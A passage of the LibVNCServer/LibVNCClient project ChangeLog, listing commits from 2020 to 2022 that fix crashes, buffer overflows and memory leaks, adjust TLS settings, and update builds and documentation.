	framebuffer exchange Fixes segfaults in rfbHideCursor(), maybe elsewhere, too.

2022-08-05  Christian Beier <info@christianbeier.net>

	* libvncserver/main.c: libvncserver: lock out client reads during
	framebuffer exchange Closes #435

2022-08-05  Maxim Devaev <mdevaev@gmail.com>

	* CMakeLists.txt, libvncclient/tls_gnutls.c: libvncclient: use
	gnutls_handshake_set_timeout()

2022-08-05  Christian Beier <info@christianbeier.net>

	* libvncserver/tight.c: libvncserver/tight: avoid division-by-zero

2022-08-04  Christian Beier <info@christianbeier.net>

	* rfb/rfbproto.h: rfb/rfbproto: extend rfbCloseSocket() to prevent
	double closes Specifically on Android newer 11, this would cause aborts by the
	fdsan checker, see

	https://developer.android.com/about/versions/11/behavior-changes-all#fdsanIt's also generally safer to mark a closed fd as closed as to not
	try to re-use it.

2022-08-04  Maxim Devaev <mdevaev@gmail.com>

	* libvncclient/tls_gnutls.c: libvncclient: rfbAnonTLSPriority =
	"NORMAL:+ANON-ECDH:+ANON-DH" (#530) I.e. added ANON-ECDH just for better compatibility. Taken from
	TigerVNC.

2022-08-04  Maxim Devaev <mdevaev@gmail.com>

	* libvncclient/rfbproto.c, libvncclient/tls_gnutls.c,
	libvncclient/tls_openssl.c: libvncclient: allow non-encrypted
	subauth methods inside VeNCrypt (#529) Following https://github.com/LibVNC/libvncserver/issues/458 rfbNoAuth and rfbVncAuth are not actually part of VeNCrypt, however
	it is important to support them to ensure better compatibility.
	When establishing a connection, the client does not know whether the
	server supports encryption, and always prefers VeNCrypt if enabled
	Next, if encryption is not available on the server, the connection
	will fail. Since the RFB doesn't have any downgrade methods in case
	of failure, a client that does not support unencrypted VeNCrypt
	methods will never be able to connect.  rfbVeNCryptPlain is also supported for better compatibility.  The RFB specification also considers any ordinary subauths are
	valid, which legitimizes this solution: -

	https://github.com/rfbproto/rfbproto/blob/master/rfbproto.rst#vencrypt> any of the normal VNC security types (except VeNCrypt) may be sent For security and backward compatibility reasons, encrypted
	connections take precedence over unencrypted ones

2022-08-03  Christian Beier <info@christianbeier.net>

	* libvncserver/main.c, libvncserver/sockets.c, rfb/rfb.h: 
	libvncserver: indicate client thread end by other means than sock v2 This is a less intrusive version of
	336fc84ed055577473df738239dc342426a1ba08 Before, the client-to-server thread would end when the client's
	socket was set to RFB_INVALID_SOCKET. However, there's a race
	condition where the client's socket can be set to invalid while the
	client-to-server thread is in select(), causing
	https://github.com/bk138/droidVNC-NG/issues/8.  Fix this by: * introducing an additional RFB_SHUTDOWN state for clients * use this as an end condition in the client-to-server thread
	  instead of the socket * move the self-pipe notification to rfbCloseClient from   rfbShutdownServer, but only pthread_join() in rfbShutdownServer

2022-07-24  Christian Beier <info@christianbeier.net>

	* libvncserver/main.c, libvncserver/sockets.c, rfb/rfb.h: Revert
	"libvncserver: indicate client thread end by other means than
	socket" This reverts commit 336fc84ed055577473df738239dc342426a1ba08.  Waiting for the client-to-server thread to finish in
	rfbCloseClient() caused deadlocks in production environments.  Revert the patch and redo in a little bit less intrusive way.

2022-07-18  Christian Beier <info@christianbeier.net>

	* libvncserver/main.c, libvncserver/sockets.c, rfb/rfb.h: 
	libvncserver: indicate client thread end by other means than socket Before, the client-to-server thread would end when the client's
	socket was set to RFB_INVALID_SOCKET. However, there's a race
	condition where the client's socket can be set to invalid while the
	client-to-server thread is in select(), causing
	https://github.com/bk138/droidVNC-NG/issues/8.  Fix this by: * introducing an additional RFB_SHUTDOWN state for clients * use this as an end condition in the client-to-server thread
	  instead of the socket * move the self-pipe notification to rfbCloseClient from   rfbShutdownServer.

2022-07-18  Christian Beier <info@christianbeier.net>

	* libvncserver/rfbserver.c: libvncserver: ensure refCount==0 when
	disconnecting other clients The idea is taken from rfbShutdownServer().

2022-07-14  Tobias Junghans <tobydox@veyon.io>

	* libvncclient/rfbproto.c: libvncclient: add missing return value to
	SendExtDesktopSize

2022-07-14  Christian Beier <info@christianbeier.net>

	* examples/example.c: examples/blooptest: add a way of shutting down
	from the main thread

2022-07-05  Christian Beier <info@christianbeier.net>

	* CMakeLists.txt, client_examples/sshtunnel.c: client_examples: add
	SSH tunneling example using libssh2

2022-06-23  badda71 <webersebastian@yahoo.de>

	* libvncclient/sockets.c: libvncclient: replace gethostbyname() with
	getaddrinfo() man gethostbyname: "The gethostbyname*(), gethostbyaddr*(),
	herror(), and hstrerror() functions are obsolete.  Applications
	should use getaddrinfo(3), getnameinfo(3), and gai_strerror(3)
	instead." Furthermore, the man page states that `gethostbyname()` is
	MT-Unsafe, probably due to the fact that it retuns a pointer to
	static data. Thus, by using `getaddrinfo()`, we improve the
	multithreading soundness of LibVNCClient.

2022-06-16  Christian Beier <info@christianbeier.net>

	* client_examples/ppmtest.c: client_examples/ppmtest: only handle
	message if wait yielded one This is more correct and in line with the other examples.

2022-05-12  Fabrice Fontaine <fontaine.fabrice@gmail.com>

	* common/crypto_openssl.c: common/crypto_openssl.c: fix build with
	libressl >= 3.5.0 (#522) Fix the following build failure with libressl >= 3.5.0:
	/nvmedata/autobuild/instance-26/output-1/build/libvncserver-0.9.13/common/crypto_openssl.c: In function 'dh_generate_keypair':
	/nvmedata/autobuild/instance-26/output-1/build/libvncserver-0.9.13/common/crypto_openssl.c:149:7: error: dereferencing pointer to incomplete type 'DH' {aka 'struct dh_st'}  149 |     dh->p = BN_bin2bn(prime, keylen, NULL);       |       ^~ Fixes:  -

	http://autobuild.buildroot.org/results/49b3940b9d0432cb5fb0c5d22dfa017b18c6e233Signed-off-by: Fabrice Fontaine <fontaine.fabrice@gmail.com>

2022-05-10  Christian Beier <info@christianbeier.net>

	* README.md: README: document transport and encryption support

2022-05-09  Christian Beier <info@christianbeier.net>

	* rfb/rfb.h: rfb/rfb.h: increase UPDATE_BUF_SIZE by 2768 bytes Simply raise the default to 32768 which is not an awful lot of an
	increase and should not hurt the embedded guys.  If someone needs more, we can still go down the malloc() route and
	make the buffer size configurable, but leave this to the users to
	request and KISS for now.  Closes #521

2022-05-08  Christian Beier <info@christianbeier.net>

	* examples/repeater.c: examples: extend repeater docs with a HOWTO
	for an UltraVNC repeater Closes #87

2022-05-07  Christian Beier <info@christianbeier.net>

	* examples/repeater.c: examples: fix repeater rfbInitServer(), which zeros out all the server's fds, was called
	after the client was connected, essentially erasing info about the
	just-made connection.  Call it before connecting out so that the new client's info
	persists.  Closes #465

2022-04-28  Antenore Gatta <antenore@simbiosi.org>

	* client_examples/vnc2mpg.c: client_examples: explicitly include
	avcodec.h for ffmpeg example Build fails with the master branch of FFmpeg with these kinds of
	errors: ``` ../client_examples/vnc2mpg.c:55:5: error: unknown type name
	     âAVCodecContextâ AVCodecContext *enc;      ^~~~~~~~~~~~~~ ``` This patch adds `libavcodec/avcodec.h` in vnc2mpg.c

2022-04-27  Christian Beier <info@christianbeier.net>

	* README.md: README: add a commercial use FAQ Closes #437

2022-04-27  Christian Beier <info@christianbeier.net>

	* TODO.md: TODO: delete and create/update issues #515, #396, #516, #517, #518, #519

2022-04-19  Christian Beier <info@christianbeier.net>

	* rfb/rfbclient.h: rfb/rfbclient: document new screen member re #511, #341

2022-04-19  Marco Fortina <102903237+marcofortina@users.noreply.github.com>

	* client_examples/SDLvncviewer.c, libvncclient/rfbproto.c,
	libvncclient/vncviewer.c, rfb/rfbclient.h: libvncclient: add support
	for SetDesktopSize This adds support for

	https://github.com/rfbproto/rfbproto/blob/master/rfbproto.rst#setdesktopsize in libvncclient.Closes #341, closes #452.

2022-04-16  Alex Converse <alex.converse@gmail.com>

	* test/encodingstest.c: test/encodingstest: fix some ASAN issues - rfbClientCleanup which is automatically in some failure scenarios   tries to interepret client data as rfbClientData - sizeof char pointer vs array

2022-04-14  Alex Converse <alex.converse@gmail.com>

	* libvncserver/translate.c: libvncserver: fix pixel format equality
	for different values of trueColour Compare boolean truthiness only. The spec implies that only zero vs
	non-zero matters.
	https://github.com/rfbproto/rfbproto/blob/master/rfbproto.rst#setpixelformat

2022-04-10  maxnet <bos@je-eigen-domein.nl>

	* libvncserver/sockets.c, libvncserver/websockets.c: libvncserver:
	fix buffer overflow in webSocketsEncodeHybi() The websocket code has internal buffers that expect data not to be
	larger than UPDATE_BUF_SIZE - Modify rfbWriteExact() to split larger writes in multiple   frames.  - Let webSocketsEncodeHybi() return -1 if somebody else   tries to pass a too large buffer to it.    (While in the libvncserver code rfbWriteExact() is the only   function that calls websocketEncode(), it is exposed by rfb.h,   so could theoretically also be called from application code) Closes #484 Signed-off-by: Floris Bos <bos@je-eigen-domein.nl>

2022-04-10  maxnet <bos@je-eigen-domein.nl>

	* libvncserver/main.c, libvncserver/private.h,
	libvncserver/rfbserver.c, libvncserver/tight.c,
	libvncserver/zlib.c, rfb/rfb.h: libvncserver: remove thread local
	storage in Tight and Zlib handling ...to prevent artifacts on ARM platform (#490) * zlib encoding: remove use of TLS variables Use the beforeEncBuf/afterEncBuf members of rfbClientRec that are
	used by multiple encodings as buffers, instead of TLS variables.  Fixes memory leak in which buffers were never free'd on client
	disconnect.  (rfbZlibCleanup() never did anything, as it was not
	called from the client output thread in which the buffer's where
	malloc'ed.  Cannot see the value of TLS variables from other
	threads.  beforeEncBuf/AfterEncBuf does get freed by existing code in
	rfbClientConnectionGone() ) Signed-off-by: Floris Bos <bos@je-eigen-domein.nl> * tightvnc encoding: remove use of TLS variables - Moves some TLS variables to rfbClientRec. Palette to stack.  - Prevents artifacts on ARM platform   Closes #363   Closes #442   Closes #451 - Fixes memory leak in which buffers are not free'd after client   disconnect.  Signed-off-by: Floris Bos <bos@je-eigen-domein.nl> * Tight: make CodeQL happy Co-authored-by: Christian Beier <info@christianbeier.net>

2022-04-06  Christian Beier <info@christianbeier.net>

	* libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c: 
	libvncserver: fix Tight file transfer root for Android

2022-04-06  Christian Beier <info@christianbeier.net>

	* libvncserver/tightvnc-filetransfer/rfbtightserver.c: libvncserver:
	init Tight file transfer also if no cmdline args there

2022-04-06  Christian Beier <info@christianbeier.net>

	* examples/filetransfer.c: examples: register extension before
	rfbGetScreen()

2022-03-30  dsilakov <dsilakov@gmail.com>

	* libvncserver/websockets.c: libvncserver: prevent crash on
	incomplete WebSocket handshake

2022-03-30  Thorsten Scherer <t.scherer@eckelmann.de>

	* CMakeLists.txt: CMake: Make Source file extensions explicit Compiling using version 3.20.5 cmake yields a warning like the
	following: CMake Warning (dev) at CMakeLists.txt:490 (add_library):   Policy CMP0115 is not set: Source file extensions must be
	  explicit.  Run "cmake --help-policy CMP0115" for policy details.
	  Use the cmake_policy command to set the policy and suppress this
	warning.    File:     /<build-path>/libvncserver-0.9.13/common/crypto_libgcrypt.c Fix this warning by adding the file extension.  While doing this make the extension for crypto_openssl explicit as
	well.  Signed-off-by: Thorsten Scherer <t.scherer@eckelmann.de>

2022-03-18  Alex Converse <alex.converse@gmail.com>

	* rfb/rfb.h: libvncserver: fix ABI compatility with v0.9.13 Move added rfbScreenInfo member to the end of the struct.  Fixes https://github.com/LibVNC/libvncserver/issues/507

2022-03-16  badda71 <webersebastian@yahoo.de>

	* libvncclient/rfbproto.c: libvncclient: detect UltraVNC and
	TightVNC servers by security type ...in addition to using the legacy way of checking RFB protocol
	versions.  Closes #505

2022-03-05  Tobias Junghans <tobydox@veyon.io>

	* libvncclient/cursor.c, libvncserver/cursor.c,
	libvncserver/hextile.c, libvncserver/selbox.c, libvncserver/tight.c: 
	Fix potential multiplication overflows (#504)

2022-02-15  Christian Beier <info@christianbeier.net>

	* CMakeLists.txt: CMake: check for htobe64 in sys/endian.h as well Closes #499 Credits and thanks go to Derek Schrock for pointing this out.

2022-02-15  Derek Schrock <dereks@lifeofadishwasher.com>

	* libvncserver/websockets.c, libvncserver/ws_decode.h: 
	libvncserver/ws_decode: include endian.h in ws_decode.h

2022-01-23  Christian Beier <info@christianbeier.net>

	* libvncserver/rfbssl_gnutls.c: libvncserver/rfbssl_gnutls: fix
	crash when no -sslcertfile set Actually bail out on the same condition as rfbssl_openssl does.  Spotted by Joel Hutchinson <joelhutchinson407@gmail.com>, thanks!

2022-01-20  Gaurav Ujjwal <gujjwal00@gmail.com>

	* libvncclient/tls_openssl.c: libvncclient/tls_openssl: Update
	anonymous cipher list (#494) Using 'aNULL' enables anonymous Elliptic Curve cipher suits.  It
	improves compatibility with some TLS libraries, e.g. GnuTLS.  Ref: https://www.openssl.org/docs/man1.1.1/man1/ciphers.html

2021-12-10  archont94 <radoslaw.karasinski@gmail.com>

	* CMakeLists.txt: CMake: allow to build without examples or tests Co-authored-by: archont94 <radoslaw.karasinski+github@gmail.com>

2021-12-08  Christian Beier <info@christianbeier.net>

	* CONTRIBUTING.md: CONTRIBUTING: add (some) contribution guidelines

2021-12-01  archont94 <radoslaw.karasinski@gmail.com>

	* libvncserver/main.c,
	libvncserver/tightvnc-filetransfer/rfbtightserver.c, rfb/rfb.h,
	rfb/rfbregion.h: libvncserver: change functions taking no args from
	f() to f(void) ... as () means any number of arguments opposed to (void) which
	means none.

2021-09-27  Christian Beier <info@christianbeier.net>

	* README.md: README: document how to use in common buildsystems
	(#481)

2021-09-26  Kang Lin <kl222@126.com>

	* CMakeLists.txt, cmake/Modules/LibVNCServerConfig.cmake.in: CMake:
	add cmake configure files (#472)

2021-09-22  Christian Beier <info@christianbeier.net>

	* README.md: README: document that UltraVNC MSLogonII is now
	supported re #480

2021-09-22  Christian Beier <info@christianbeier.net>

	* README.md: README: let TravisCI badge point to travis-ci.com

2021-09-22  Kyle Evans <kevans91@users.noreply.github.com>

	* libvncclient/rfbproto.c, rfb/rfbproto.h: libvncclient: implement
	UltraVNC's MSLogonII authentication scheme (#480) UltraVNC's MSLogonII protocol is relatively simple; the server sends
	along DH parameters, we generate a shared secret, and we encrypt
	both the username and password with it. The pubkey, username, and
	password then get written back to the server.  Fixes #372

2021-07-19  Christian Beier <info@christianbeier.net>

	* libvncclient/zrle.c: libvncclient: fix stack buffer overflow in
	ZRLE handler The for loop iterates 'type' times which could exceed the former
	palette array size 16. Fix this by increasing the palette array
	size.  Spotted by Max Hofmann, thanks!

2021-07-19  Christian Beier <info@christianbeier.net>

	* libvncclient/trle.c: libvncclient: guard against another buffer
	overflow in TRLE handling Spotted by Ilja Van Sprundel, thanks!

2021-07-14  Christian Beier <info@christianbeier.net>

	* libvncclient/tight.c: libvncclient: guard against heap overflow in
	Tight encoding Spotted by Lukas Kupczyk, thanks!

2021-07-14  Christian Beier <info@christianbeier.net>

	* libvncclient/ultra.c: libvncclient: handle negative payload sizes
	for ultra encoding Spotted by Lukas Kupczyk, thanks!

2021-06-12  Christian Beier <cb@shoutrlabs.com>

	* CMakeLists.txt: CMake: improve libjpeg-turbo fallback check

2021-06-12  Christian Beier <cb@shoutrlabs.com>

	* CMakeLists.txt: CMake: fix TurboVNC-related regex

2021-06-12  Christian Beier <cb@shoutrlabs.com>

	* CMakeLists.txt: CMake: test jpeglib.h header for TurboVNC if
	compile check fails

2021-05-22  Christian Beier <info@christianbeier.net>

	* libvncclient/trle.c: libvnclient: guard against buffer overflow in
	TRLE handling Spotted by Max Hofmann, thanks!

2021-06-04  Christian Beier <info@christianbeier.net>

	* libvncserver/rfbserver.c: libvncserver: ensure reverse conn is
	started in threaded mode

2021-05-28  Ryo Ota <nwtgck@nwtgck.org>

	* examples/mac.c: examples/mac: fix a typo

2021-05-26  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/rfbserver.c: libvncserver: pass unsigned char
	pointers to zlib

2021-05-26  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/rfbserver.c: libvncserver: fix string truncation
	warning Calling snprintf with two arguments already containing up to
	MAX_PATH bytes causes some GCC versions to complain about potential
	string truncation: libvncserver/rfbserver.c: In function 'rfbSendDirContent': libvncserver/rfbserver.c:1396:50: error: '%s' directive output may
	be truncated writing up to 255 bytes into a region of size between 0
	and 259 [-Werror=format-truncation=]      snprintf(retfilename,sizeof(retfilename),"%s/%s", path,
	     direntp->d_name);                                                   ^~ libvncserver/rfbserver.c:1396:5: note: 'snprintf' output between 2
	and 516 bytes into a destination of size 260      snprintf(retfilename,sizeof(retfilename),"%s/%s", path,
	     direntp->d_name);
	^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~This can be fixed easily by doubling the size of retfilename.

2021-05-22  Christian Beier <info@christianbeier.net>

	* libvncclient/vncviewer.c: libvncclient: ensure framebuffer alloc
	doesn't leave dangling pointer Could happen when the size check failed: it would potentially leave
	client->frameBuffer as a free()'d but non-NULL pointer which other
	parts of the lib or application code could interpret as usable.  Pointed out by Ilja Van Sprundel, thanks!

2021-05-13  Dinglan Peng <pengdinglan@gmail.com>

	* libvncserver/main.c, libvncserver/rfbserver.c, rfb/rfb.h,
	rfb/rfbproto.h: libvncserver: add support for UTF8 clipboard Tested against TigerVNC and a modified version of x11vnc:
	https://github.com/pdlan/x11vnc

2021-05-02  Christian Beier <info@christianbeier.net>

	* .travis.yml: TravisCI: use MacOS 10.14

2021-04-26  Christian Beier <info@christianbeier.net>

	* rfb/rfb.h: rfb.h: document that extension supports TightVNC-1.3.x
	file transfer Closes #467

2021-04-26  Christian Beier <info@christianbeier.net>

	* examples/filetransfer.c: examples: document that this is about
	TightVNC-1.3.x file transfer re #467

2020-12-14  Christian Beier <info@christianbeier.net>

	* : Merge pull request #454 from timgates42/bugfix_typo_functions docs: fix simple typo, funtions -> functions

2020-12-02  Christian Beier <info@christianbeier.net>

	* : Merge pull request #453 from any1/qemu-extended-key-event libvncclient: add qemu extended key event

2020-11-30  Andri Yngvason <andri@yngvason.is>

	* rfb/rfbproto.h: rfb/rfbproto: Add qemu extended key event

2020-11-21  Christian Beier <info@christianbeier.net>

	* libvncclient/vncviewer.c: libvncclient: free vncRec memory in
	rfbClientCleanup() Otherwise we leak memory. Spotted by Ramin Farajpour Cami
	<ramin.blackhat@gmail.com>, thanks!

2020-10-13  gitdevmod <djdomics@gmail.com>

	* client_examples/vnc2mpg.c: vnc2mpg: fix building on Windows 10 Fix compilation on Windows 10/mingw

2020-10-06  Christian Beier <info@christianbeier.net>

	* .github/workflows/codeql-analysis.yml: Create codeql-analysis.yml

2020-09-16  sanjay-cpu <66668807+sanjay-cpu@users.noreply.github.com>

	* .travis.yml: TravisCI: add support for ppc64le

2020-09-16  Jonas Ådahl <jadahl@gmail.com>

	* libvncserver/zlib.c: zlib: Clear buffer pointers on cleanup (#444) The pointers to the buffers were freed, and the size fields were set
	to 0, but the buffer pointers themsef was not set to NULL, when
	shutting down, meaning the next time used, NULL checks would not
	tell whether the pointer is valid. This caused crashes ending with   #0  0x00007ffff73729e5 in raise () from /lib64/libc.so.6   #1  0x00007ffff735b895 in abort () from /lib64/libc.so.6   #2  0x00007ffff73b6857 in __libc_message () from /lib64/libc.so.6   #3  0x00007ffff73bdd7c in malloc_printerr () from /lib64/libc.so.6   #4  0x00007ffff73c2f1a in realloc () from /lib64/libc.so.6   #5  0x00007ffff78b558e in rfbSendOneRectEncodingZlib (cl=0x4a4b80,
	  x=0, y=0, w=800, h=40) at
	  /home/jonas/Dev/gnome/libvncserver/libvncserver/zlib.c:106 #6
	  0x00007ffff78b5dec in rfbSendRectEncodingZlib (cl=0x4a4b80, x=0,
	  y=0, w=800, h=600) at
	  /home/jonas/Dev/gnome/libvncserver/libvncserver/zlib.c:308 #7
	  0x00007ffff7899453 in rfbSendFramebufferUpdate (cl=0x4a4b80,
	  givenUpdateRegion=0x49ef70) at
	  /home/jonas/Dev/gnome/libvncserver/libvncserver/rfbserver.c:3264
	#8  0x00007ffff789079d in rfbUpdateClient (cl=0x4a4b80) at
	  /home/jonas/Dev/gnome/libvncserver/libvncserver/main.c:1275 #9
	0x00007ffff78905f5 in rfbProcessEvents (screen=0x4d5790, usec=0) at
	/home/jonas/Dev/gnome/libvncserver/libvncserver/main.c:1251

2020-08-09  Christian Beier <info@christianbeier.net>

	* libvncserver/auth.c: libvncserver/auth: don't keep security
	handlers from previous runs Whyohsoever security handlers are stored in a variable global to the
	application, not in the rfbScreen struct. This meant that security
	handlers registered once would stick around forever before this
	commit.

2020-08-07  Christian Beier <info@christianbeier.net>

	* libvncserver/tightvnc-filetransfer/filetransfermsg.c: 
	libvncserver/tightvnc-filetransfer: fix ZeroSizeDataMsg send for
	64bit systems

2020-08-07  Christian Beier <info@christianbeier.net>

	* libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c: 
	libvncserver/tightvnc-filetransfer: frame msg send with sendMutex
	locking

2020-08-07  Christian Beier <info@christianbeier.net>

	* libvncserver/scale.c: libvncserver/scale: add sendMutex locking to
	ResizeFrameBuffer msg send

2020-08-04  Christian Beier <info@christianbeier.net>

	* libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c: 
	tightvnc-filetransfer: fix file upload for 64-bit systems Before, the server would read more than the actually sent 4 byte
	time stamp, missing the next message's header and in turn treating
	message payload as header data.

2020-07-21  Christian Beier <info@christianbeier.net>

	* libvncserver/main.c: libvncserver: move self-pipe check in client
	thread before any FD_ISSET ...and jump to loop start on encountering something in the
	self-pipe.  Rationale is that on some platforms FD_ISSET(-1) triggers `FORTIFY:
	FD_ISSET: file descriptor -1 < 0`. This is the case on Android, for
	instance.

2020-07-21  Christian Beier <info@christianbeier.net>

	* libvncserver/main.c, rfb/rfb.h: libvncserver: properly end
	listener thread on shutdown ... by using the self-pipe trick.

2020-07-20  Christian Beier <info@christianbeier.net>

	* libvncserver/main.c: libvncserver: don't NULL out internal of the
	default cursor ...otherwise an rfbScreen created after rfbScreenCleanup() was
	called gets assigned an invalid cursor struct.

2020-07-01  Christian Beier <info@christianbeier.net>

	* NEWS.md: NEWS: mention the CVEs closed by 0.9.13

2020-06-25  Christian Beier <info@christianbeier.net>

	* CMakeLists.txt: CMake: only add turbojpeg test if configured
	WITH_JPEG Closes #430

2020-06-25  Alexander Tsoy <alexander@tsoy.me>

	* CMakeLists.txt, test/includetest.sh: test: fix includetest to use
	CMAKE_MAKE_PROGRAM (#431) includetest currently fais if, for example, ninja is used as a CMake
	generator. Fix it by using CMAKE_MAKE_PROGRAM in the test.

2020-06-17  efim bushmanov <66992851+efimbushmanov@users.noreply.github.com>

	* libvncserver/rfbserver.c: libvncserver: be more clear about code
	intention * fix "backgroundLoop != FALSE" means true thingy, add missed
	screen->backgroundLoop check if LIBPTHREAD defined * fix "small improv Co-authored-by: Efim Bushmanov <you@example.com>

2020-06-13  Christian Beier <info@christianbeier.net>

	* ChangeLog: Update ChangeLog for 0.9.13 Closes #376

2020-06-13  Christian Beier <info@christianbeier.net>

	* NEWS.md: NEWS: update

2020-06-13  Christian Beier <info@christianbeier.net>

	* libvncclient/vncviewer.c: libvncclient: remove unused function

2020-06-13  Christian Beier <info@christianbeier.net>

	* libvncclient/vncviewer.c: libvncclient: make sure password prompt
	is shown on win32

2020-06-10  Christian Beier <info@christianbeier.net>

	* libvncclient/vncviewer.c: libvncclient: don't let cleanup depend
	on libjpeg build support They're not connected to libjpeg.  Closes #424

2020-06-10  Christian Beier <info@christianbeier.net>

	* : Merge pull request #425 from veyon/misc Various minor cleanups and type cast fixes

2020-06-10  Tobias Junghans <tobydox@veyon.io>

	* common/turbojpeg.c: turbojpeg: eliminate dead store

2020-06-10  Tobias Junghans <tobydox@veyon.io>

	* common/turbojpeg.c: turbojpeg: don't store uninitialized value If handle is NULL, tjCompress2() will not modify size and an
	uninitialized stack value would be written to jpegSize.

2020-06-10  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/rfbssl_gnutls.c: libvncserver/rfbssl_gnutls:
	eliminate dead store

2020-06-10  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c: 
	tightvnc-filetransfer: make global vars static

2020-06-10  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/rfbregion.c: libvncserver: remove unused assignments

2020-06-08  Tobias Junghans <tobydox@veyon.io>

	* examples/cursors.c, libvncclient/sasl.c, libvncserver/sockets.c: 
	Minor type cast fixes and cleanups The format string indicates an unsigned integer which generates a
	warning with some compilers when passing a signed int.  Similarly strcpy() takes a signed char pointer.

2020-06-09  Christian Beier <info@christianbeier.net>

	* NEWS.md: NEWS: update

2020-06-08  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #415 from veyon/handle-realloc-failures Handle memory realloc failures

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/corre.c, libvncserver/rre.c, libvncserver/tight.c,
	libvncserver/ultra.c, libvncserver/zlib.c: libvncserver: encodings:
	handle memory realloc failures When realloc() fails, previous pointer values have to be retained to
	avoid leaking memory.

2020-06-03  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #417 from veyon/logic Fix various logical errors

2020-06-03  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #416 from veyon/security Add NULL pointer checks + other minor security improvements

2020-06-01  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, rfb/rfb.h, rfb/rfbclient.h, {common =>
	rfb}/threading.h: build: make common threading header public Closes #421

2020-06-01  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, test/includetest.sh: test: add test that checks if
	using installed headers works re #421

2020-05-28  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #418 from veyon/misc Proper return values for examples && alignment fixes in
	libvnc[client|server]

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/sockets.c: libvncserver: sockets: unlock mutex on
	error

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/scale.c: libvncserver: scale: cast to 64 bit before
	shifting Since pixel_value is 64 bit the data type of the shift operand
	should be 64 bit too to prevent integer overflows.

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/rfbserver.c: libvncserver: rfbserver: drop checks
	before free() Also eliminate one free() which will never be called with a non-NULL
	value.

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/translate.c: libvncserver: fix pointer
	aliasing/alignment issue Accessing byte-aligned data through uint16_t pointers can cause
	crashes on some platforms or reduce the performance. Therefore
	ensure a proper stack alignment.

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/tight.c: libvncserver: tight: always free PNG palette If unused (currently not the case due to disabled code), it's NULL
	anyway and free() will do nothing.

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncclient/rfbproto.c: libvncclient: fix pointer
	aliasing/alignment issue Accessing byte-aligned data through uint32_t pointers can cause
	crashes on some platforms or reduce the performance. Therefore
	ensure a proper stack alignment.

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/cursor.c: libvncserver: cursor: enable debugging via
	macro

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncclient/trle.c, libvncclient/zrle.c: libvncclient: fix always
	false/true expressions

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* test/tjbench.c: test/tjbench: fix minor issues

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* examples/cursors.c, examples/example.c, examples/fontsel.c,
	examples/repeater.c, examples/simple15.c, test/encodingstest.c: 
	examples: fix various logical mistakes

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* examples/backchannel.c, examples/camera.c,
	examples/colourmaptest.c, examples/cursors.c, examples/example.c,
	examples/filetransfer.c, examples/fontsel.c, examples/pnmshow.c,
	examples/pnmshow24.c, examples/repeater.c, examples/simple.c,
	examples/simple15.c, examples/vncev.c, examples/zippy.c: examples:
	use non-zero return code on error

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/rfbserver.c: libvncserver: rfbserver: init file size
	field

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/rfbregion.c, libvncserver/rfbserver.c: libvncserver:
	add missing NULL pointer checks

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/corre.c, libvncserver/hextile.c, libvncserver/rre.c: 
	libvncserver: encodings: prevent OOB accesses

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/cargs.c, libvncserver/cursor.c, libvncserver/font.c,
	libvncserver/main.c, libvncserver/rfbregion.c,
	libvncserver/rfbserver.c, libvncserver/selbox.c,
	libvncserver/tight.c, libvncserver/websockets.c: libvncserver:
	handle memory allocation failures

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* common/vncauth.c: common/vncauth: handle memory allocation failure

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncclient/rfbproto.c, libvncclient/sasl.c,
	libvncclient/vncviewer.c: libvncclient: handle memory allocation
	failures

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* examples/colourmaptest.c, examples/cursors.c, examples/example.c,
	examples/fontsel.c, examples/pnmshow.c, examples/repeater.c,
	examples/rotatetemplate.c, examples/simple15.c, examples/vncev.c: 
	examples: check for memory allocation failures

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncclient/hextile.c, libvncclient/rfbproto.c,
	libvncclient/vncviewer.c: libvncclient: fix missing/redundant
	initializations

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/ws_decode.c: libvncserver: ws_decode: eliminate
	duplicate code

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/rfbserver.c: libvncserver: rfbserver: drop duplicate
	assignment

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/corre.c, libvncserver/rre.c: libvncserver: encodings:
	disable dead code

2020-05-27  Tobias Junghans <tobydox@veyon.io>

	* libvncclient/sasl.c: libvncclient: clean up unused labels

2020-05-27  Christian Beier <dontmind@freeshell.org>

	* README.md: README: simplify Android build instructions The PNG switch is not needed anymore.

2020-05-22  Christian Beier <dontmind@freeshell.org>

